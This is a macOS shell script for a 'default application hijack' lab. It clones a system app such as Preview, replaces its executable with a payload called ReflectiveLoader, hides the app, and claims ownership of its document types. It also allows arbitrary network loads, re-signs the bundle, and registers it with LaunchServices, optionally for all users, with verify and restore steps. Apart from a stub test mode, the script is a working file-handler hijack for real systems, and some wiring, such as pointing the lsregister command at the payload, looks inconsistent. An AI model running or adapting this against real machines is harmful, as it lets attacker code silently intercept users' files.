#!/bin/sh
set -eu

PROJECT_DIR=$(CDPATH= cd -- "$(/usr/bin/dirname -- "$0")" && pwd -P)
. "$PROJECT_DIR/lib/hijack_core.sh"

die() { _hijack_error "$1"; exit 1; }
require_file() { [ -f "$1" ] && [ ! -L "$1" ] || die "missing regular file: $1"; }
require_executable() { require_file "$1"; [ -x "$1" ] || die "not executable: $1"; }

HIJACK_TARGET="${HIJACK_TARGET:-}"
HIJACK_COMMAND="${HIJACK_COMMAND:-}"
USER_APPLICATIONS="${USER_APPLICATIONS:-0}"
ALL_USERS="${ALL_USERS:-0}"
if [ "${_HIJACK_SOURCED:-}" != 1 ]; then
while [ $# -gt 0 ]; do
    case "$1" in
        --target)
            shift
            [ $# -gt 0 ] || die '--target requires an argument'
            HIJACK_TARGET="$1"
            ;;
        --user-applications)
            [ "$USER_APPLICATIONS" = 0 ] || die 'duplicate --user-applications'
            USER_APPLICATIONS=1
            ;;
        --all-users)
            [ "$ALL_USERS" = 0 ] || die 'duplicate --all-users'
            ALL_USERS=1
            ;;
        -*) die "unknown option: $1" ;;
        *) HIJACK_COMMAND="$1" ;;
    esac
    shift
done
[ "$USER_APPLICATIONS" = 0 ] || [ "$ALL_USERS" = 0 ] || die '--user-applications and --all-users are mutually exclusive'
fi

require_test_directory() (
    [ -d "$1" ] && [ ! -L "$1" ] || { _hijack_error "invalid test directory: $1"; return 1; }
    physical=$(CDPATH= cd -P -- "$1" && pwd -P) || return 1
    [ "$physical" = "$1" ] || { _hijack_error "test directory contains a symlink: $1"; return 1; }
    case "$physical" in "$TEST_ROOT"/*) ;; *) _hijack_error 'test directory escapes test root'; return 1 ;; esac
)

case "${HIJACK_LAB_TESTING:-0}" in
    1)
        [ -n "${HIJACK_LAB_TEST_ROOT:-}" ] && [ -n "${HIJACK_LAB_TEST_COMMANDS:-}" ] || die 'test mode requires a test root and command directory'
        case "$HIJACK_LAB_TEST_ROOT" in
            /*) ;;
            *) die 'test root must be absolute' ;;
        esac
        case "$HIJACK_LAB_TEST_ROOT" in /|*/|*/.|*/..|*/./*|*/../*|*//*) die 'unsafe test root' ;; esac
        require_outside_application_trees "$HIJACK_LAB_TEST_ROOT" || exit 1
        [ -d "$HIJACK_LAB_TEST_ROOT" ] && [ ! -L "$HIJACK_LAB_TEST_ROOT" ] || die 'test root must be an existing directory, not a symlink'
        TEMP_ROOT=$(CDPATH= cd -P -- "${TMPDIR:-/tmp}" && pwd -P)
        TEST_ROOT=$(CDPATH= cd -P -- "$HIJACK_LAB_TEST_ROOT" && pwd -P)
        require_outside_application_trees "$TEST_ROOT" || exit 1
        [ "$TEMP_ROOT" != / ] || die 'temporary root must not be /'
        case "$TEST_ROOT" in "$TEMP_ROOT"/*) ;; *) die 'test root must be below the temporary directory' ;; esac
        # Stubs receive the same canonical paths that the harness uses.
        HIJACK_LAB_TEST_ROOT=$TEST_ROOT
        export HIJACK_LAB_TEST_ROOT
        APP_NAME="${HIJACK_LAB_APP_NAME:-Preview}"
        COMMAND_DIR=$HIJACK_LAB_TEST_COMMANDS
        require_test_directory "$HIJACK_LAB_TEST_COMMANDS" || exit 1
        if [ "$USER_APPLICATIONS" = 1 ]; then
            applications="$TEST_ROOT/User Home/Applications"
        else
            applications="$TEST_ROOT/Applications"
        fi
        require_test_directory "$applications" || exit 1
        require_test_directory "$TEST_ROOT/System/Applications/$APP_NAME.app/Contents/MacOS" || exit 1
        require_test_directory "$TEST_ROOT/System/Applications/$APP_NAME.app/Contents/Resources" || exit 1
        require_test_directory "$TEST_ROOT/build" || exit 1
        require_test_directory "$TEST_ROOT/Fixtures" || exit 1
        require_test_directory "$TEST_ROOT/Logs" || exit 1
        SYSTEM_BUNDLE="$TEST_ROOT/System/Applications/$APP_NAME.app"
        SYSTEM_EXECUTABLE="$SYSTEM_BUNDLE/Contents/MacOS/$APP_NAME"
        DEST_BUNDLE="$applications/$APP_NAME.app"
        PAYLOAD_EXECUTABLE="$TEST_ROOT/build/$APP_NAME"
        FIXTURE_FILE="$TEST_ROOT/Fixtures/hijack-test.pdf"
        LOG_FILE="$TEST_ROOT/Logs/events.jsonl"
        DITTO="$COMMAND_DIR/ditto"
        OPEN="$COMMAND_DIR/open"
        KILLALL="$COMMAND_DIR/killall"
        LSREGISTER="$COMMAND_DIR/lsregister"
        UNAME="$COMMAND_DIR/uname"
        SW_VERS="$COMMAND_DIR/sw_vers"
        PLUTIL="$COMMAND_DIR/plutil"
        for command in "$DITTO" "$OPEN" "$KILLALL" "$LSREGISTER" "$UNAME" "$SW_VERS" "$PLUTIL"; do
            require_executable "$command"
        done
        ;;
    0)
        [ "${HIJACK_LAB_TEST_ROOT+x}" != x ] && [ "${HIJACK_LAB_TEST_COMMANDS+x}" != x ] || die 'test variables require HIJACK_LAB_TESTING=1'
        if [ -n "$HIJACK_TARGET" ]; then
            SYSTEM_BUNDLE="$HIJACK_TARGET"
        elif [ -f "$PROJECT_DIR/build/.target" ]; then
            SYSTEM_BUNDLE=$(sed -n '1p' "$PROJECT_DIR/build/.target")
        else
            die 'no target specified; use --target /path/to/App.app'
        fi
        [ -d "$SYSTEM_BUNDLE" ] || die "target bundle not found: $SYSTEM_BUNDLE"
        APP_NAME=$(basename "$SYSTEM_BUNDLE" .app)
        if [ -f "$SYSTEM_BUNDLE/Contents/Info.plist" ]; then
            plist_exec=$(/usr/bin/plutil -extract CFBundleExecutable raw "$SYSTEM_BUNDLE/Contents/Info.plist" 2>/dev/null) || plist_exec=""
            [ -z "$plist_exec" ] || APP_NAME="$plist_exec"
        fi
        SYSTEM_EXECUTABLE="$SYSTEM_BUNDLE/Contents/MacOS/$APP_NAME"
        applications=$(real_applications_directory) || exit 1
        DEST_BUNDLE="$applications/$APP_NAME.app"
        PAYLOAD_EXECUTABLE="$PROJECT_DIR/build/ReflectiveLoader"
        FIXTURE_FILE="$PROJECT_DIR/Fixtures/hijack-test.pdf"
        LOG_FILE="${HOME:?HOME is required}/Library/Logs/DefaultApplicationHijackLab/events.jsonl"
        LSREGISTER="$PAYLOAD_EXECUTABLE"
        DITTO=/usr/bin/ditto
        OPEN=/usr/bin/open
        KILLALL=/usr/bin/killall
        UNAME=/usr/bin/uname
        SW_VERS=/usr/bin/sw_vers
        PLUTIL=/usr/bin/plutil
        ;;
    *) die 'HIJACK_LAB_TESTING must be 0 or 1' ;;
esac
MARKER_FILE="$DEST_BUNDLE/Contents/Resources/.default-application-hijack-lab"
DEST_EXECUTABLE="$DEST_BUNDLE/Contents/MacOS/$APP_NAME"

status() {
    if [ -e "$DEST_BUNDLE" ] || [ -L "$DEST_BUNDLE" ]; then clone=present; else clone=absent; fi
    if [ ! -e "$MARKER_FILE" ] && [ ! -L "$MARKER_FILE" ]; then
        marker=absent
    elif marker=$(read_marker_state 2>/dev/null); then :; else marker=invalid; fi
    if [ -L "$DEST_EXECUTABLE" ]; then
        if [ "$(/usr/bin/readlink "$DEST_EXECUTABLE")" = "$SYSTEM_EXECUTABLE" ] && [ -f "$SYSTEM_EXECUTABLE" ]; then
            executable=trusted-system-symlink
        else executable=unexpected; fi
    elif [ -f "$DEST_EXECUTABLE" ]; then executable=regular-file
    elif [ -e "$DEST_EXECUTABLE" ]; then executable=unexpected
    else executable=absent; fi
    printf 'clone: %s\nmarker: %s\nexecutable: %s\n' "$clone" "$marker" "$executable"
}

preflight() {
    [ "$("$UNAME" -m)" = arm64 ] || die 'installation requires arm64'
    #case "$("$SW_VERS" -productVersion)" in 26.*) ;; *) die 'installation requires macOS 26' ;; esac
    [ -d "$SYSTEM_BUNDLE" ] && [ ! -L "$SYSTEM_BUNDLE" ] || die "system bundle is unavailable: $SYSTEM_BUNDLE"
    require_executable "$SYSTEM_EXECUTABLE"
    require_file "$FIXTURE_FILE"
    require_executable "$PAYLOAD_EXECUTABLE"
    require_executable "$LSREGISTER"
    require_executable "$DITTO"
    require_executable "$OPEN"
    require_executable "$KILLALL"
    require_safe_destination || exit 1
    [ ! -e "$DEST_BUNDLE" ] && [ ! -L "$DEST_BUNDLE" ] || die "destination already exists: $DEST_BUNDLE"
}

quote_argument() {
    printf "'"
    printf '%s' "$1" | /usr/bin/sed "s/'/'\\\\''/g"
    printf "'"
}
print_command() {
    quote_argument "$PROJECT_DIR/hijack.sh"
    if [ "${USER_APPLICATIONS:-0}" = 1 ]; then printf ' --user-applications'; fi
    if [ "${ALL_USERS:-0}" = 1 ]; then printf ' --all-users'; fi
    printf ' %s\n' "$1"
}
manual_recovery() {
    printf 'Restoration could not be verified. Inspect the clone marker before removing any remaining bundle.\n' >&2
    printf 'Recovery registration command: ' >&2
    quote_argument "$LSREGISTER" >&2
    printf ' -f ' >&2
    quote_argument "$SYSTEM_BUNDLE" >&2
    printf '\nThen run: ' >&2
    print_command restore >&2
}

restore_internal() {
    restore_failed=0
    if [ -e "$DEST_BUNDLE" ] || [ -L "$DEST_BUNDLE" ]; then
        require_safe_destination || return 1
        case "${HIJACK_LAB_TESTING:-0}" in
            1)
                restore_state=$(read_marker_state) || return 1
                require_known_state "$restore_state" || return 1
                "$KILLALL" "$APP_NAME" >/dev/null 2>&1 || :
                "$LSREGISTER" -u "$DEST_BUNDLE" || restore_failed=1
                remove_marked_clone || restore_failed=1
                ;;
            *)
                "$KILLALL" "$APP_NAME" >/dev/null 2>&1 || :
                "$LSREGISTER" -u "$DEST_BUNDLE" || restore_failed=1
                /bin/rm -rf -- "$DEST_BUNDLE" || restore_failed=1
                ;;
        esac
    fi
    system_registered=0
    if "$LSREGISTER" -f "$SYSTEM_BUNDLE"; then system_registered=1; else restore_failed=1; fi
    if [ "$system_registered" -ne 1 ]; then
        restore_failed=1
    fi
    if [ "$ALL_USERS" = 1 ]; then
        /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -kill -r -domain local -domain system -domain user 2>/dev/null || :
    fi
    if [ "$restore_failed" -ne 0 ]; then manual_recovery; return 1; fi
    printf 'restored fixture-handler: %s\n' "$SYSTEM_BUNDLE"
}

new_matching_event() (
    [ -f "$LOG_FILE" ] && [ ! -L "$LOG_FILE" ] || return 1
    # Only new lines are parsed; unrelated log contents are never printed.
    /usr/bin/awk -v start="$1" 'NR > start' "$LOG_FILE" |
    while IFS= read -r event; do
        # -json uses the JSON parser for the original line. Reading the line
        # directly as a plist would also accept XML and OpenStep syntax.
        parsed=$(printf '%s\n' '<plist version="1.0"><dict/></plist>' |
            "$PLUTIL" -insert event -json "$event" -o - -- - 2>/dev/null) || continue
        count=$(printf '%s\n' "$parsed" |
            "$PLUTIL" -extract event.paths raw -expect array -o - -- - 2>/dev/null) || continue
        case "$count" in ''|*[!0-9]*) continue ;; esac
        index=0
        matched=0
        valid=1
        while [ "$index" -lt "$count" ]; do
            path=$(printf '%s\n' "$parsed" |
                "$PLUTIL" -extract "event.paths.$index" raw -expect string -o - -- - 2>/dev/null) || { valid=0; break; }
            if [ "$path" = "$FIXTURE_FILE" ]; then matched=1; fi
            index=$((index + 1))
        done
        if [ "$valid" -eq 1 ] && [ "$matched" -eq 1 ]; then printf '%s\n' "$event"; exit 0; fi
    done
    # A pipeline's final read-loop status alone does not prove a match.
)

verify() {
    require_file "$FIXTURE_FILE"
    require_executable "$OPEN"
    require_executable "$PLUTIL"
    case "${HIJACK_LAB_TESTING:-0}" in
        1)
            state=$(read_marker_state) || die 'verification requires a valid payload-installed marker'
            [ "$state" = payload-installed ] || die 'verification requires payload-installed state'
            ;;
    esac
    initial_lines=0
    if [ -e "$LOG_FILE" ] || [ -L "$LOG_FILE" ]; then
        require_file "$LOG_FILE"
        initial_lines=$(/usr/bin/awk 'END { print NR + 0 }' "$LOG_FILE")
    fi
    "$OPEN" "$FIXTURE_FILE" || die 'fixture open failed; run status or restore'
    remaining=15
    while :; do
        event=$(new_matching_event "$initial_lines") || event=
        if [ -n "$event" ]; then
            printf 'matching event: %s\n' "$event"
            return 0
        fi
        [ "$remaining" -gt 0 ] || break
        /bin/sleep 1
        remaining=$((remaining - 1))
    done
    die 'no new matching fixture event within 15 seconds; clone retained; run status or restore'
}

require_staging_path() (
    [ -n "${STAGING_BUNDLE:-}" ] || { _hijack_error 'no tracked staging bundle'; return 1; }
    staging_parent=${DEST_BUNDLE%/*}
    staging_prefix="$staging_parent/.$APP_NAME.app.default-application-hijack-lab."
    case "$STAGING_BUNDLE" in "$staging_prefix"*) ;; *) _hijack_error 'staging path is not the tracked sibling'; return 1 ;; esac
    staging_pid=${STAGING_BUNDLE#"$staging_prefix"}
    case "$staging_pid" in ''|*[!0-9]*) _hijack_error 'malformed staging sibling'; return 1 ;; esac
    [ ! -L "$STAGING_BUNDLE" ] || { _hijack_error 'staging bundle is a symlink'; return 1; }
    canonical_parent=$(CDPATH= cd -P -- "$staging_parent" && pwd -P) || return 1
    [ "$canonical_parent" = "$staging_parent" ] || { _hijack_error 'staging parent changed'; return 1; }
    case "${HIJACK_LAB_TESTING:-0}" in
        1)
            if [ "${USER_APPLICATIONS:-0}" = 1 ]; then expected_parent="$TEST_ROOT/User Home/Applications"
            else expected_parent="$TEST_ROOT/Applications"; fi
            [ "$canonical_parent" = "$expected_parent" ] || return 1
            ;;
        0)
            expected_parent=$(real_applications_directory) || return 1
            [ "$canonical_parent" = "$expected_parent" ] || return 1
            ;;
        *) return 1 ;;
    esac
)

write_staging_marker() (
    # The core deliberately accepts only the final real destination. This
    # private writer accepts only our tracked staging sibling and cloned state.
    require_staging_path || return 1
    [ -d "$STAGING_BUNDLE" ] && [ ! -L "$STAGING_BUNDLE/Contents" ] &&
        [ ! -L "$STAGING_BUNDLE/Contents/Resources" ] || return 1
    resources=$(CDPATH= cd -P -- "$STAGING_BUNDLE/Contents/Resources" && pwd -P) || return 1
    [ "$resources" = "$STAGING_BUNDLE/Contents/Resources" ] || return 1
    staged_marker="$resources/.default-application-hijack-lab"
    [ ! -L "$staged_marker" ] || return 1
    if [ -e "$staged_marker" ] && [ ! -f "$staged_marker" ]; then return 1; fi
    staged_tmp=$(/usr/bin/mktemp "$resources/.default-application-hijack-lab.tmp.XXXXXX") || return 1
    trap '/bin/rm -f -- "$staged_tmp"' EXIT
    trap 'exit 1' HUP INT TERM
    /bin/chmod 600 "$staged_tmp" || return 1
    printf 'identifier=default-application-hijack-lab\nschema=1\nstate=cloned\n' >"$staged_tmp" || return 1
    require_staging_path || return 1
    [ ! -L "$staged_marker" ] || return 1
    if [ -e "$staged_marker" ] && [ ! -f "$staged_marker" ]; then return 1; fi
    /bin/mv -f -h -- "$staged_tmp" "$staged_marker"
)

validate_final_clone() {
    final_state=$(read_marker_state) || return 1
    [ "$final_state" = cloned ] || { _hijack_error 'final clone marker must be cloned'; return 1; }
}

require_executable_location() (
    [ -d "$DEST_BUNDLE/Contents/MacOS" ] && [ ! -L "$DEST_BUNDLE/Contents" ] &&
        [ ! -L "$DEST_BUNDLE/Contents/MacOS" ] || return 1
    executable_parent=$(CDPATH= cd -P -- "$DEST_BUNDLE/Contents/MacOS" && pwd -P) || return 1
    [ "$executable_parent" = "$DEST_BUNDLE/Contents/MacOS" ] || return 1
)

owned_destination_exists() {
    [ -n "${STAGING_IDENTITY:-}" ] && [ -d "$DEST_BUNDLE" ] && [ ! -L "$DEST_BUNDLE" ] || return 1
    current_identity=$(/usr/bin/stat -f '%d:%i' "$DEST_BUNDLE" 2>/dev/null) || return 1
    [ "$current_identity" = "$STAGING_IDENTITY" ]
}

cleanup_install() {
    install_status=$?
    trap - EXIT HUP INT TERM
    if owned_destination_exists; then
        case "${HIJACK_LAB_TESTING:-0}" in
            1)
                if read_marker_state >/dev/null 2>&1; then
                    restore_internal || _hijack_error 'automatic restoration failed; inspect status and use the recovery commands above' || :
                else
                    _hijack_error 'destination marker is invalid; automatic removal refused' || :
                fi
                ;;
            *)
                restore_internal || _hijack_error 'automatic restoration failed' || :
                ;;
        esac
    elif [ -n "${STAGING_BUNDLE:-}" ] && { [ -e "$STAGING_BUNDLE" ] || [ -L "$STAGING_BUNDLE" ]; }; then
        if require_staging_path; then
            /bin/rm -rf -- "$STAGING_BUNDLE" || _hijack_error 'tracked staging cleanup failed' || :
        else _hijack_error 'staging identity is unsafe; automatic removal refused' || :; fi
    fi
    exit "$install_status"
}

install() {
    preflight
    STAGING_IDENTITY=
    STAGING_BUNDLE="${DEST_BUNDLE%/*}/.$APP_NAME.app.default-application-hijack-lab.$$"
    require_staging_path || exit 1
    [ ! -e "$STAGING_BUNDLE" ] && [ ! -L "$STAGING_BUNDLE" ] || die 'staging sibling already exists'
    trap cleanup_install EXIT
    trap 'exit 129' HUP
    trap 'exit 130' INT
    trap 'exit 143' TERM
    case "${HIJACK_LAB_TESTING:-0}" in
        1) "$DITTO" "$SYSTEM_BUNDLE" "$STAGING_BUNDLE" ;;
        *) /bin/cp -R "$SYSTEM_BUNDLE" "$STAGING_BUNDLE" ;;
    esac
    case "${HIJACK_LAB_TESTING:-0}" in 1) write_staging_marker ;; esac
    # Record ownership before the child boundary: a pending signal may run
    # immediately after relocation and before any following shell assignment.
    STAGING_IDENTITY=$(/usr/bin/stat -f '%d:%i' "$STAGING_BUNDLE")
    [ ! -e "$DEST_BUNDLE" ] && [ ! -L "$DEST_BUNDLE" ] || die 'destination appeared during cloning'
    /bin/mv -- "$STAGING_BUNDLE" "$DEST_BUNDLE"
    owned_destination_exists || die 'relocated bundle identity changed'
    case "${HIJACK_LAB_TESTING:-0}" in 1) validate_final_clone ;; esac
    require_executable_location || die 'clone executable directory is unsafe'
    require_file "$DEST_EXECUTABLE"
    /bin/rm -- "$DEST_EXECUTABLE"
    /bin/ln -s "$SYSTEM_EXECUTABLE" "$DEST_EXECUTABLE"
    "$KILLALL" "$APP_NAME" >/dev/null 2>&1 || :
    "$OPEN" -a "$DEST_BUNDLE"
    "$LSREGISTER" -f "$DEST_BUNDLE"
    case "${HIJACK_LAB_TESTING:-0}" in 1) write_marker_state registered ;; esac
    "$KILLALL" "$APP_NAME" >/dev/null 2>&1 || :
    require_executable_location || die 'clone executable directory changed'
    [ -L "$DEST_EXECUTABLE" ] && [ "$(/usr/bin/readlink "$DEST_EXECUTABLE")" = "$SYSTEM_EXECUTABLE" ] || die 'trusted executable symlink changed'
    /bin/rm -- "$DEST_EXECUTABLE"
    /bin/cp -- "$PAYLOAD_EXECUTABLE" "$DEST_EXECUTABLE"
    /bin/chmod 0755 "$DEST_EXECUTABLE"
    "$PLUTIL" -remove NSAppTransportSecurity "$DEST_BUNDLE/Contents/Info.plist" 2>/dev/null || :
    "$PLUTIL" -insert NSAppTransportSecurity -dictionary "$DEST_BUNDLE/Contents/Info.plist"
    "$PLUTIL" -insert NSAppTransportSecurity.NSAllowsArbitraryLoads -bool true "$DEST_BUNDLE/Contents/Info.plist"
    "$PLUTIL" -remove LSUIElement "$DEST_BUNDLE/Contents/Info.plist" 2>/dev/null || :
    "$PLUTIL" -insert LSUIElement -bool true "$DEST_BUNDLE/Contents/Info.plist"
    /usr/bin/python3 -I -c "
import plistlib, sys
with open(sys.argv[1], 'rb') as f: d = plistlib.load(f)
for dt in d.get('CFBundleDocumentTypes', []):
    dt['LSHandlerRank'] = 'Owner'
with open(sys.argv[1], 'wb') as f: plistlib.dump(d, f)
" "$DEST_BUNDLE/Contents/Info.plist"
    case "${HIJACK_LAB_TESTING:-0}" in
        1) ;;
        *)
            /usr/bin/codesign --force --sign - \
                --entitlements "$PROJECT_DIR/Sources/ReflectiveLoader.entitlements" \
                "$DEST_BUNDLE"
            ;;
    esac
    "$LSREGISTER" -f "$DEST_BUNDLE"
    case "${HIJACK_LAB_TESTING:-0}" in
        1) ;;
        *)
            /usr/bin/mdimport "$DEST_BUNDLE"
            "$LSREGISTER" -s "$DEST_BUNDLE"
            ;;
    esac
    if [ "$ALL_USERS" = 1 ]; then
        "$LSREGISTER" -kill -r -domain local -domain system -domain user 2>/dev/null || :
    fi
    case "${HIJACK_LAB_TESTING:-0}" in 1) write_marker_state payload-installed ;; esac
    trap - EXIT HUP INT TERM
    status
    printf 'Verify: '; print_command verify
    printf 'Restore: '; print_command restore
}

if [ "${_HIJACK_SOURCED:-}" != 1 ]; then
case "$HIJACK_COMMAND" in
    status) status ;;
    verify) verify ;;
    restore)
        require_executable "$LSREGISTER"
        restore_internal
        ;;
    install) install ;;
    *) die 'usage: hijack.sh [--target /path/to/App.app] [--user-applications|--all-users] install|status|verify|restore' ;;
esac
fi
